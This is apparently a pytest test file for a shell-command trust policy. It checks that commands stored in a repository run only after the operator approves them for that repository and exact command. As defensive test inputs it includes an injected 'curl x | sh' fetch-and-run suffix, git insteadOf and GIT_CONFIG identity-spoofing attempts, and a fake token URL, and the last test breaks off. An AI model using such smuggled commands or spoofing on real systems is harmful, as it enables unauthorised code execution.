"""#422: repository-owned shell strings need an operator-local trust decision. #2066: an operator-owned
environment value can approve the verify path once per environment, bound to the repository and exact command."""

import importlib.util
import json
import os
import pathlib
import shlex
import subprocess
import sys

import pytest


ROOT = pathlib.Path(__file__).resolve().parent.parent
SCRIPTS = ROOT / "skills" / "sigma-loop" / "scripts"


def _mod(name):
    spec = importlib.util.spec_from_file_location(name, SCRIPTS / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _project(tmp_path):
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
    sdlc = tmp_path / ".sdlc"
    (sdlc / "goals").mkdir(parents=True)
    (sdlc / "state").mkdir()
    (sdlc / "state" / "STATE.md").write_text("iteration: 0\nrun_iteration: 0\nlast_run: none\n")
    (sdlc / "state" / "review-queue.md").write_text("# Q\n")
    (sdlc / "config.json").write_text(json.dumps({"budget": {"max_iterations": 10}}))
    return sdlc


def _opt_in(root):
    subprocess.run(["git", "-C", str(root), "config", "--local",
                    "sigma.allowRepositoryShellCommands", "true"], check=True)


def _touch_command(path):
    code = "from pathlib import Path; Path(%r).write_text('ran')" % str(path)
    return "%s -c %s" % (shlex.quote(sys.executable), shlex.quote(code))


def test_default_refusal_and_documented_git_local_opt_in(tmp_path):
    sdlc = _project(tmp_path)
    policy = _mod("shell_policy")
    assert policy.repository_shell_commands_allowed(tmp_path) is False
    _opt_in(tmp_path)
    assert policy.repository_shell_commands_allowed(sdlc) is True


def test_false_or_malformed_git_local_values_refuse(tmp_path):
    sdlc = _project(tmp_path)
    policy = _mod("shell_policy")
    subprocess.run(["git", "-C", str(tmp_path), "config", "--local",
                    "sigma.allowRepositoryShellCommands", "false"], check=True)
    assert policy.repository_shell_commands_allowed(sdlc) is False
    subprocess.run(["git", "-C", str(tmp_path), "config", "--local",
                    "sigma.allowRepositoryShellCommands", "not-a-boolean"], check=True)
    assert policy.repository_shell_commands_allowed(sdlc) is False


def test_pipeline_command_is_not_run_until_operator_opt_in(tmp_path):
    sdlc = _project(tmp_path)
    sentinel = tmp_path / "pipeline-ran"
    (sdlc / "pipeline.json").write_text(json.dumps({"name": "demo", "stages": [{
        "checks": {"forward": [{"name": "attacker", "run": _touch_command(sentinel)}]}
    }]}))
    pipeline = _mod("pipeline")
    refused = pipeline.build_card(sdlc)
    assert not sentinel.exists()
    assert refused["stages"][0]["signals"][0]["status"] == pipeline.FAIL
    assert "REFUSED" in refused["stages"][0]["signals"][0]["detail"]
    _opt_in(tmp_path)
    allowed = pipeline.build_card(sdlc)
    assert sentinel.exists()
    assert allowed["stages"][0]["signals"][0]["status"] == pipeline.PASS


def test_embed_command_is_not_run_until_operator_opt_in(tmp_path):
    sdlc = _project(tmp_path)
    sentinel = tmp_path / "embed-ran"
    command = _touch_command(sentinel) + "; printf '[0.25]'"
    backlog = _mod("backlog_check")
    assert backlog._run_embedder("input", command, cwd=tmp_path) is None
    assert not sentinel.exists()
    _opt_in(tmp_path)
    assert backlog._run_embedder("input", command, cwd=sdlc) == [0.25]
    assert sentinel.exists()


def test_verify_command_is_not_run_until_operator_opt_in(tmp_path):
    sdlc = _project(tmp_path)
    sentinel = tmp_path / "verify-ran"
    command = _touch_command(sentinel)
    (sdlc / "goals" / "0001.md").write_text(
        "---\nid: 0001\nstatus: pending\nverify_command: %s\n---\n" % command)
    loop = _mod("loop")
    goal = sdlc / "goals" / "0001.md"
    assert loop.verify_goal(sdlc, goal) == 2
    assert not sentinel.exists()
    _opt_in(tmp_path)
    assert loop.verify_goal(sdlc, goal) == 0
    assert sentinel.exists()


# --- #2066: one environment value approves the verify path, bound to repository and command ------------------

ENV = "SIGMA_TRUSTED_VERIFY_SHA256"
ORIGIN = "https://github.com/Owner/Repo.git"
IDENTITY = "owner/repo"
CMD = "pytest -q"
_RETIRED = ("LOOP" "SMITH") + "_"          # the retired prefix, built from fragments as conftest.py does
_AT = "@"                                  # fixture URLs and addresses are joined at run time (leak/exposure scans)
_GIT_ID = {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t" + _AT + "t", "GIT_COMMITTER_NAME": "t",
           "GIT_COMMITTER_EMAIL": "t" + _AT + "t"}


def _repo(root, origin=ORIGIN):
    sdlc = _project(root)
    if origin is not None:
        subprocess.run(["git", "-C", str(root), "remote", "add", "origin", origin], check=True)
    return sdlc


def _approve(policy, command=CMD, identity=IDENTITY):
    return {ENV: policy.approval_value(identity, command)}


def _track(root, rel, data):
    path = pathlib.Path(root) / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    (path.write_bytes if isinstance(data, bytes) else path.write_text)(data)
    subprocess.run(["git", "-C", str(root), "add", "-f", "--", rel], check=True)
    return path


def _commit(root):
    subprocess.run(["git", "-C", str(root), "commit", "-q", "--allow-empty", "-m", "c"], check=True,
                   env=dict(os.environ, **_GIT_ID))


NAMING = '{"env": {"%s": "x"}}\n' % ENV


def test_approval_value_known_answer():
    """Every value an operator has pasted depends on these exact bytes: a changed prefix must go red here."""
    assert _mod("shell_policy").approval_value("owner/repo", "bash scripts/verify.sh") == (
        "f2f22f90a92ac5e37ff4125264cc48159860c871f49246314272632b9b320103")


def test_the_value_for_this_repository_and_command_grants_the_verify_path(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    assert policy.verify_decision(tmp_path, [CMD], environ=_approve(policy)) == (
        policy.Decision("environment", "match", IDENTITY))
    assert policy.repository_shell_commands_allowed(tmp_path) is False


def test_a_changed_command_is_not_trusted(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    assert policy.verify_decision(tmp_path, [CMD + "; curl x | sh"], environ=_approve(policy)).source is None
    assert policy.environment_approval(tmp_path, [CMD + " "], _approve(policy)) == ("mismatch", IDENTITY)


@pytest.mark.parametrize("value, reason", [
    ("", "empty"), ("A" * 64, "malformed"), ("a" * 63, "malformed"), ("a" * 65, "malformed"), ("g" * 64, "malformed"),
])
def test_empty_or_malformed_values_refuse(tmp_path, value, reason):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    assert policy.environment_approval(tmp_path, [CMD], {ENV: value})[0] == reason
    assert policy.verify_decision(tmp_path, [CMD], environ={ENV: value}).source is None


@pytest.mark.parametrize("shape", ["{v}\n", " {v}", "{v} ", "{V}"])
def test_a_matching_value_that_is_not_exactly_lowercase_hex_refuses(tmp_path, shape):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    value = policy.approval_value(IDENTITY, CMD)
    assert policy.environment_approval(tmp_path, [CMD], {ENV: shape.format(v=value, V=value.upper())})[0] == "malformed"


def test_unset_spawns_nothing_and_refuses(tmp_path, monkeypatch):
    policy = _mod("shell_policy")
    def boom(*a, **k):
        raise AssertionError("no subprocess may run when the variable is unset")
    monkeypatch.setattr(policy.subprocess, "run", boom)
    assert policy.environment_approval(tmp_path, [CMD], {}) == ("unset", None)


@pytest.mark.parametrize("sep", [",", " ", "\n", ";"])
def test_several_values_refuse_even_when_every_part_matches(tmp_path, sep):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    value = policy.approval_value(IDENTITY, CMD)
    assert policy.environment_approval(tmp_path, [CMD], {ENV: value + sep + value})[0] == "malformed"


def test_every_declared_command_must_match(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    assert policy.environment_approval(tmp_path, [CMD, CMD + "; make deploy"], _approve(policy))[0] == "mismatch"
    for commands in ([], [""], [None]):
        assert policy.environment_approval(tmp_path, commands, _approve(policy))[0] == "no-command", commands


def test_any_exception_refuses(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    assert policy.environment_approval(tmp_path, ["pytest \udcff"], _approve(policy))[0] == "error"
    assert policy.environment_approval(tmp_path, None, _approve(policy))[0] == "error"
    assert policy.verify_decision(tmp_path, None, environ=_approve(policy)).source is None


@pytest.mark.parametrize("url", [
    "https://github.com/Owner/Repo.git", "git" + _AT + "github.com:Owner/Repo.git",
    "ssh://git" + _AT + "github.com/Owner/Repo", "github.com-work:Owner/Repo.git",
    "http://proxy" + _AT + "127.0.0.1:1234/git/Owner/Repo",
    "".join(["https://x-access-token", ":", "ghs", "_secret", _AT, "github.com/Owner/Repo"]),
])
def test_identity_is_the_origin_owner_and_name_case_folded(tmp_path, url):
    _repo(tmp_path, origin=url)
    assert _mod("shell_policy").repository_identity(tmp_path) == IDENTITY


def test_identity_accepts_an_underscore_and_refuses_dot_segments(tmp_path):
    policy = _mod("shell_policy")
    _repo(tmp_path, origin="https://github.com/owner/my_repo.git")
    assert policy.repository_identity(tmp_path) == "owner/my_repo"
    subprocess.run(["git", "-C", str(tmp_path), "remote", "set-url", "origin", "https://github.com/owner/.."],
                   check=True)
    assert policy.repository_identity(tmp_path) is None


def test_two_origin_urls_give_no_identity(tmp_path):
    _repo(tmp_path)
    subprocess.run(["git", "-C", str(tmp_path), "config", "--local", "--add", "remote.origin.url",
                    "https://github.com/Other/Repo.git"], check=True)
    policy = _mod("shell_policy")
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy)) == ("no-identity", None)


def test_a_local_insteadof_cannot_borrow_another_repositorys_identity(tmp_path):
    """`git remote get-url` applies insteadOf; the identity read must not."""
    _repo(tmp_path, origin="https://github.com/attacker/widget.git")
    subprocess.run(["git", "-C", str(tmp_path), "config", "--local",
                    "url.https://github.com/owner/repo.git.insteadOf", "https://github.com/attacker/widget.git"],
                   check=True)
    policy = _mod("shell_policy")
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy)) == ("mismatch", "attacker/widget")


def test_another_repository_or_no_origin_is_not_trusted(tmp_path):
    policy = _mod("shell_policy")
    other, bare, plain = tmp_path / "other", tmp_path / "bare", tmp_path / "plain"
    for d in (other, bare, plain):
        d.mkdir()
    _repo(other, origin="https://github.com/Owner/Fork.git")
    assert policy.environment_approval(other, [CMD], _approve(policy)) == ("mismatch", "owner/fork")
    _repo(bare, origin=None)
    assert policy.environment_approval(bare, [CMD], _approve(policy)) == ("no-identity", None)
    assert policy.environment_approval(plain, [CMD], _approve(policy)) == ("no-identity", None)


def test_an_explicit_git_local_false_vetoes_the_environment_value(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    subprocess.run(["git", "-C", str(tmp_path), "config", "--local", "sigma.allowRepositoryShellCommands",
                    "false"], check=True)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy))[0] == "vetoed"


def test_a_non_boolean_git_local_value_vetoes_the_environment_value(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    subprocess.run(["git", "-C", str(tmp_path), "config", "--local", "sigma.allowRepositoryShellCommands",
                    "maybe"], check=True)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy))[0] == "vetoed"


_LISTED = [
    ".claude/settings.json", ".claude/settings.local.json", ".devcontainer.json", ".devcontainer/devcontainer.json",
    ".devcontainer/python/devcontainer.json", ".vscode/settings.json", ".env", ".envrc", "mise.toml", ".mise.toml",
    "mise.local.toml", ".mise.local.toml", ".config/mise.toml", ".config/mise/config.toml", ".codex/config.toml",
    "mise/config.toml", ".mise/config.toml", ".config/mise/conf.d/tools.toml", "mise.production.toml",
    ".mise.production.toml", ".rtx.toml",
]


@pytest.mark.parametrize("rel", _LISTED)
def test_a_tracked_host_config_file_naming_the_variable_refuses(tmp_path, rel):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    _track(tmp_path, rel, NAMING)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy)) == ("repository-sourced", rel)


def test_the_host_config_list_is_the_one_the_tests_cover():
    """The parametrised list above and the module's own list must not drift apart."""
    expected = (set(_LISTED) - {".devcontainer/python/devcontainer.json", ".config/mise/conf.d/tools.toml",
                                 "mise.production.toml", ".mise.production.toml"}
                | {".devcontainer/*/devcontainer.json", ".config/mise/conf.d/*.toml", "mise.*.toml", ".mise.*.toml"})
    assert set(_mod("shell_policy").HOST_ENV_PATHS) == expected


def test_an_untracked_host_config_file_or_another_tracked_file_is_not_a_loader(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "settings.json").write_text(NAMING)           # untracked: the operator's own
    _track(tmp_path, ".claude/README.md", "set %s in the environment panel\n" % ENV)
    _track(tmp_path, "docs/setup.md", "set %s in the environment panel\n" % ENV)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy))[0] == "match"


def _linked(tmp_path, where):
    """A main checkout with a clean, committed `.claude/settings.json`, and a linked worktree at ``where``: the
    main-checkout scan then sees only the clean copy, so a finding can come only from the worktree's own listing."""
    main = tmp_path / "main"
    main.mkdir()
    _repo(main)
    _track(main, ".claude/settings.json", '{"env": {}}\n')
    _commit(main)
    where.parent.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "-C", str(main), "worktree", "add", "-q", "-b", "wt", str(where)], check=True)
    return main, where


def test_repository_sourced_is_checked_from_the_repository_top(tmp_path):
    _, wt = _linked(tmp_path, tmp_path / "wt")
    policy = _mod("shell_policy")
    (wt / ".claude" / "settings.json").write_text(NAMING)
    sub = wt / "svc" / "x"
    sub.mkdir(parents=True)
    assert policy.environment_approval(sub, [CMD], _approve(policy)) == ("repository-sourced", ".claude/settings.json")


def test_from_a_subdirectory_the_listing_is_joined_to_the_top_never_above_it(tmp_path):
    """C2: run from <top>/svc/api, a relative listing (`../../.claude/settings.json`) joined to the top would leave the
    repository and read `<top>/../../.claude/settings.json`; a decoy there must never decide the answer, and the
    worktree's own tracked file must."""
    _, top = _linked(tmp_path, tmp_path / "a" / "b" / "top")
    policy = _mod("shell_policy")
    sub = top / "svc" / "api"
    sub.mkdir(parents=True)
    decoy = tmp_path / "a" / ".claude" / "settings.json"
    decoy.parent.mkdir(parents=True)
    decoy.write_text(NAMING)                                              # outside the repository, untracked
    assert policy.environment_approval(sub, [CMD], _approve(policy))[0] == "match"
    decoy.write_text('{"env": {}}\n')
    (top / ".claude" / "settings.json").write_text(NAMING)
    assert policy.environment_approval(sub, [CMD], _approve(policy)) == (
        "repository-sourced", ".claude/settings.json")


@pytest.mark.parametrize("text", [
    '{"env": {"\\u0053IGMA_TRUSTED_VERIFY_SHA256": "x"}}',
    '{"env": {"SIGMA_TRUSTED_VERIFY_\\u0053HA256": "x"}}',
    '[env]\n"\\U00000053IGMA_TRUSTED_VERIFY_SHA256" = "x"\n',
    '[env]\n"\\x53IGMA_TRUSTED_VERIFY_SHA256" = "x"\n',
    "export sigma_trusted_verify_sha256=x\n",
])
def test_an_escaped_or_recased_name_is_still_seen(tmp_path, text):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    _track(tmp_path, ".claude/settings.json", text)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy))[0] == "repository-sourced"


@pytest.mark.parametrize("rel", [".Claude/settings.json", ".claude/Settings.json", ".CLAUDE/SETTINGS.JSON",
                                 ".Envrc", "MISE.toml"])
def test_a_case_variant_of_a_host_config_path_refuses(tmp_path, rel):
    """S1 (diff review): on a case-insensitive filesystem (macOS by default) the host opens these files."""
    _repo(tmp_path)
    policy = _mod("shell_policy")
    _track(tmp_path, rel, NAMING)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy)) == ("repository-sourced", rel)


def test_a_case_variant_project_root_is_never_skipped(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    _track(tmp_path, "svc/.claude/settings.json", NAMING)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy), roots=(tmp_path / "SVC",))[0] != "match"


@pytest.mark.parametrize("name", ["Straße", "İstanbul", "ﬁle", "cafe\u0301"])
def test_a_project_root_under_a_non_ascii_folder_is_checked_relative_to_itself(tmp_path, name):
    """R1 (diff re-check): case-folding changes the length of these names, and macOS keeps a decomposed name on
    disk while git prints it composed; the prefix must come from git, compared exactly."""
    _repo(tmp_path)
    policy = _mod("shell_policy")
    project = tmp_path / name / "web"
    project.mkdir(parents=True)
    rel = subprocess.run(["git", "-C", str(project), "rev-parse", "--show-prefix"], capture_output=True, text=True,
                         check=True).stdout.strip() + ".claude/settings.json"
    _track(tmp_path, rel, NAMING)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy), roots=(project,))[0] == "repository-sourced"


def test_a_checkout_path_with_a_newline_gives_no_identity(tmp_path):
    """S7: git prints one path per line; a path holding a newline must not be split into a wrong toplevel."""
    odd = tmp_path / "a\nb"
    odd.mkdir()
    _repo(odd)
    policy = _mod("shell_policy")
    assert policy.environment_approval(odd, [CMD], _approve(policy)) == ("no-identity", None)


def test_a_root_that_is_not_a_git_checkout_refuses(tmp_path):
    repo, plain = tmp_path / "repo", tmp_path / "plain"
    repo.mkdir(); plain.mkdir()
    _repo(repo)
    policy = _mod("shell_policy")
    assert policy.environment_approval(repo, [CMD], _approve(policy), roots=(plain,)) == ("error", None)


def _three_worktrees(tmp_path, command):
    """The desktop layout: a main checkout, the session's own linked worktree holding `.sdlc`, and a goal worktree.
    The main checkout and the goal tree carry a clean `.claude/settings.json`; the session's copy names the variable,
    so only the project-root argument can find it (S2, diff review)."""
    main, session, goal = tmp_path / "main", tmp_path / "session", tmp_path / "goal"
    main.mkdir()
    _repo(main)
    _track(main, ".claude/settings.json", '{"env": {}}\n')
    _commit(main)
    for wt, branch in ((session, "session"), (goal, "goal")):
        subprocess.run(["git", "-C", str(main), "worktree", "add", "-q", "-b", branch, str(wt)], check=True)
    (session / ".claude" / "settings.json").write_text(NAMING)
    sdlc = session / ".sdlc"
    (sdlc / "goals").mkdir(parents=True)
    (sdlc / "state").mkdir()
    (sdlc / "state" / "STATE.md").write_text("iteration: 0\nrun_iteration: 0\nlast_run: none\n")
    (sdlc / "state" / "review-queue.md").write_text("# Q\n")
    (sdlc / "config.json").write_text(json.dumps({"budget": {"max_iterations": 10}, "verify": {"command": command}}))
    (sdlc / "goals" / "0001.md").write_text("---\nid: 0001\nstatus: pending\n---\n")
    return sdlc, goal


def test_verify_checks_the_project_root_worktree(tmp_path, monkeypatch, capsys):
    ran = tmp_path / "ran.txt"
    command = "echo x >> %s" % ran
    sdlc, goal = _three_worktrees(tmp_path, command)
    loop, policy = _mod("loop"), _mod("shell_policy")
    monkeypatch.setattr(loop, "_verified_tree", lambda *a: (str(goal), "head", False))
    monkeypatch.setenv(ENV, policy.approval_value(IDENTITY, command))
    assert loop.verify_goal(sdlc, "0001") == 2
    assert not ran.exists()
    assert "names it, and a repository cannot approve" in capsys.readouterr().err


def test_red_checks_the_project_root_worktree(tmp_path, monkeypatch, capsys):
    sdlc, goal = _three_worktrees(tmp_path, "true")
    loop, policy = _mod("loop"), _mod("shell_policy")
    monkeypatch.setattr(loop, "_verified_tree", lambda *a: (str(goal), "head", False))
    monkeypatch.setenv(ENV, policy.approval_value(IDENTITY, "true"))
    assert loop.red_goal(sdlc, "0001") == 2
    assert "names it, and a repository cannot approve" in capsys.readouterr().err


def test_a_tracked_symlink_at_a_host_config_path_refuses(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    _track(tmp_path, "config/claude.json", NAMING)
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "settings.json").symlink_to("../config/claude.json")
    subprocess.run(["git", "-C", str(tmp_path), "add", ".claude/settings.json"], check=True)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy)) == (
        "repository-sourced", ".claude/settings.json")


def test_a_tracked_symlinked_parent_directory_refuses(tmp_path):
    """C1: with `.claude` itself committed as a symlink, `.claude/settings.json` is not in the index at all."""
    _repo(tmp_path)
    policy = _mod("shell_policy")
    _track(tmp_path, "config/claude/settings.json", NAMING)
    (tmp_path / ".claude").symlink_to("config/claude")
    subprocess.run(["git", "-C", str(tmp_path), "add", ".claude"], check=True)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy)) == ("repository-sourced", ".claude")


def test_a_host_config_file_reached_through_a_symlink_out_of_the_repository_refuses(tmp_path):
    """The index holds a plain `.claude/settings.json`, but the working tree's `.claude` now points outside the
    repository: what a host would load is not the repository's file, so it is refused, even when clean."""
    top = tmp_path / "top"
    top.mkdir()
    _repo(top)
    policy = _mod("shell_policy")
    _track(top, ".claude/settings.json", '{"env": {}}\n')
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "settings.json").write_text('{"env": {}}\n')
    (top / ".claude" / "settings.json").unlink()
    (top / ".claude").rmdir()
    (top / ".claude").symlink_to(outside)
    assert policy.environment_approval(top, [CMD], _approve(policy)) == ("repository-sourced", ".claude/settings.json")


@pytest.mark.parametrize("rel", [".claude", ".claude/settings.json"])
def test_a_gitlink_at_a_host_config_path_or_parent_refuses(tmp_path, rel):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    subprocess.run(["git", "-C", str(tmp_path), "update-index", "--add", "--cacheinfo",
                    "160000,%s,%s" % ("1" * 40, rel)], check=True)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy)) == ("repository-sourced", rel)


def test_a_directory_at_a_tracked_host_config_path_refuses(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    path = _track(tmp_path, ".claude/settings.json", '{"env": {}}')
    path.unlink()
    path.mkdir()
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy))[0] == "repository-sourced"


@pytest.mark.parametrize("data", [b"\xff\xfe{}", b"{}" + b" " * (1 << 20)], ids=["invalid-utf8", "over-1MiB"])
def test_an_unreadable_or_oversized_host_config_file_refuses(tmp_path, data):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    _track(tmp_path, ".claude/settings.json", data)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy))[0] == "repository-sourced"


def test_the_main_checkout_and_the_project_root_are_checked_by_their_own_tree(tmp_path):
    """C3: each root's listing is read from that root's own checkout; the verify tree keeps a clean copy, so reading
    it in place of another root would wrongly say match."""
    main = tmp_path / "main"
    main.mkdir()
    _repo(main)
    policy = _mod("shell_policy")
    _track(main, ".claude/settings.json", '{"env": {}}\n')
    _commit(main)
    goal, session = tmp_path / "goal", tmp_path / "session"
    for wt, branch in ((goal, "goal"), (session, "session")):
        subprocess.run(["git", "-C", str(main), "worktree", "add", "-q", "-b", branch, str(wt)], check=True)
    assert policy.environment_approval(goal, [CMD], _approve(policy), roots=(session,))[0] == "match"
    (session / ".claude" / "settings.json").write_text(NAMING)
    assert policy.environment_approval(goal, [CMD], _approve(policy), roots=(session,)) == (
        "repository-sourced", ".claude/settings.json")
    assert policy.environment_approval(goal, [CMD], _approve(policy))[0] == "match"
    (main / ".claude" / "settings.json").write_text(NAMING)
    assert policy.environment_approval(goal, [CMD], _approve(policy)) == (
        "repository-sourced", ".claude/settings.json")


def test_a_project_root_in_a_subfolder_is_checked_relative_to_itself(tmp_path):
    """R4: a project whose `.sdlc` sits in a subfolder was probably launched there."""
    _repo(tmp_path)
    policy = _mod("shell_policy")
    project = tmp_path / "apps" / "web"
    _track(tmp_path, "apps/web/.claude/settings.json", NAMING)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy), roots=(project,)) == (
        "repository-sourced", "apps/web/.claude/settings.json")


def test_a_failing_git_listing_refuses(tmp_path, monkeypatch):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    real = policy.subprocess.run
    def failing_ls_files(argv, *a, **k):
        if "ls-files" in argv:
            return subprocess.CompletedProcess(argv, 128, "", "fatal: broken")
        return real(argv, *a, **k)
    monkeypatch.setattr(policy.subprocess, "run", failing_ls_files)
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy)) == ("error", None)


@pytest.mark.parametrize("name", ["GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE"])
def test_a_git_location_variable_refuses_by_name_only(tmp_path, name):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    environ = dict(_approve(policy), **{name: str(tmp_path / "decoy-secret-path")})
    reason, detail = policy.environment_approval(tmp_path, [CMD], environ)
    assert (reason, detail) == ("location-variable", name)


def test_git_config_injected_through_the_environment_cannot_borrow_an_identity(tmp_path, monkeypatch):
    _repo(tmp_path, origin="https://github.com/attacker/widget.git")
    policy = _mod("shell_policy")
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "url.https://github.com/owner/repo.git.insteadOf")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", "https://github.com/attacker/widget.git")
    monkeypatch.setenv("GIT_CONFIG_PARAMETERS",
                       "'url.https://github.com/owner/repo.git.insteadof'='https://github.com/attacker/widget.git'")
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy)) == ("mismatch", "attacker/widget")


def test_a_pathspec_variable_cannot_hide_a_tracked_host_config_file(tmp_path, monkeypatch):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    _track(tmp_path, ".claude/settings.json", NAMING)
    monkeypatch.setenv("GIT_LITERAL_PATHSPECS", "1")
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy))[0] == "repository-sourced"


def test_global_git_config_cannot_borrow_an_identity(tmp_path, monkeypatch):
    _repo(tmp_path, origin="https://github.com/attacker/widget.git")
    policy = _mod("shell_policy")
    glob = tmp_path / "global.gitconfig"
    glob.write_text('[url "https://github.com/owner/repo.git"]\n\tinsteadOf = https://github.com/attacker/widget.git\n')
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(glob))
    assert policy.environment_approval(tmp_path, [CMD], _approve(policy)) == ("mismatch", "attacker/widget")


def test_the_location_variables_match_bounded_run():
    assert _mod("shell_policy")._LOCATION_VARS == _mod("bounded_run").LOCATION_VARS


def test_either_source_is_enough_and_git_local_is_unchanged(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    assert policy.verify_decision(tmp_path, [CMD], environ={}).source is None
    _opt_in(tmp_path)
    assert policy.verify_decision(tmp_path, [CMD], environ=_approve(policy)).source == "git-local"
    assert policy.verify_decision(tmp_path, [CMD], environ=_approve(policy, "other")).source == "git-local"


def test_the_environment_value_never_grants_any_other_repository_command(tmp_path, monkeypatch):
    sdlc = _repo(tmp_path)
    sentinel = tmp_path / "pipeline-ran"
    command = _touch_command(sentinel)
    (sdlc / "pipeline.json").write_text(json.dumps({"name": "demo", "stages": [{
        "checks": {"forward": [{"name": "attacker", "run": command}]}
    }]}))
    policy = _mod("shell_policy")
    monkeypatch.setenv(ENV, policy.approval_value(IDENTITY, command))
    pipeline = _mod("pipeline")
    refused = pipeline.build_card(sdlc)
    assert not sentinel.exists()
    assert refused["stages"][0]["signals"][0]["status"] == pipeline.FAIL
    assert policy.repository_shell_commands_allowed(tmp_path) is False


def test_the_retired_prefix_spelling_never_grants(tmp_path, monkeypatch):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    monkeypatch.setenv(_RETIRED + "TRUSTED_VERIFY_SHA256", policy.approval_value(IDENTITY, CMD))
    assert policy.environment_approval(tmp_path, [CMD])[0] == "unset"
    monkeypatch.setenv(ENV, "")
    assert policy.environment_approval(tmp_path, [CMD])[0] == "empty"


def test_the_unset_refusal_is_unchanged_and_others_name_the_reason_never_a_value(tmp_path):
    _repo(tmp_path)
    policy = _mod("shell_policy")
    unset = policy.verify_decision(tmp_path, [CMD], environ={})
    assert policy.verify_refusal_message(unset) == policy.refusal_message()
    pasted = "tok-" + "SECRET123"
    bad = policy.verify_refusal_message(policy.verify_decision(tmp_path, [CMD], environ={ENV: pasted}))
    assert bad.startswith(policy.refusal_message()) and "not exactly one 64-character" in bad and pasted not in bad
    approved = _approve(policy)
    mismatch = policy.verify_refusal_message(policy.verify_decision(tmp_path, ["make x"], environ=approved))
    assert "does not approve every command" in mismatch
    assert approved[ENV] not in mismatch and policy.approval_value(IDENTITY, "make x") not in mismatch


# --- #2066: the verify path asks the decision with the commands it will run ---------------------------------

def _verify_project(tmp_path, command):
    sdlc = _repo(tmp_path)
    cfg = json.loads((sdlc / "config.json").read_text())
    cfg["verify"] = {"command": command}
    (sdlc / "config.json").write_text(json.dumps(cfg))
    (sdlc / "goals" / "0001.md").write_text("---\nid: 0001\nstatus: pending\n---\n")
    return sdlc


def _acceptance(sdlc, goal_command):
    (sdlc / "acceptance").mkdir(exist_ok=True)
    (sdlc / "acceptance" / "0001.md").write_text(
        '---\nkind: "acceptance"\ngoal: "0001"\nverify_command: %s\n---\n'
        "## Done when\n- [ ] it works\n- [ ] it is tested\n- [ ] it is documented\n" % json.dumps(goal_command))


def test_verify_runs_the_approved_command_and_refuses_a_changed_one(tmp_path, monkeypatch, capsys):
    ran = tmp_path / "ran.txt"
    command = "echo x >> %s" % ran
    sdlc = _verify_project(tmp_path, command)
    loop, policy = _mod("loop"), _mod("shell_policy")
    monkeypatch.setenv(ENV, policy.approval_value(IDENTITY, command))
    assert loop.verify_goal(sdlc, "0001") == 0
    assert ran.read_text() == "x\n"
    assert json.loads(loop.state.evidence_path(sdlc, "0001").read_text())["trust"] == "environment"
    cfg = json.loads((sdlc / "config.json").read_text())
    cfg["verify"]["command"] = command + " && echo changed >> %s" % ran
    (sdlc / "config.json").write_text(json.dumps(cfg))
    capsys.readouterr()
    assert loop.verify_goal(sdlc, "0001") == 2
    assert ran.read_text() == "x\n"
    err = capsys.readouterr().err
    assert "does not approve every command" in err and os.environ[ENV] not in err


def test_verify_evidence_records_the_git_local_source(tmp_path):
    ran = tmp_path / "ran.txt"
    sdlc = _verify_project(tmp_path, "echo x >> %s" % ran)
    _opt_in(tmp_path)
    loop = _mod("loop")
    assert loop.verify_goal(sdlc, "0001") == 0
    assert json.loads(loop.state.evidence_path(sdlc, "0001").read_text())["trust"] == "git-local"


def test_verify_refuses_an_acceptance_record_that_adds_its_own_command(tmp_path, monkeypatch, capsys):
    ran, extra = tmp_path / "ran.txt", tmp_path / "extra.txt"
    command = "echo x >> %s" % ran
    sdlc = _verify_project(tmp_path, command)
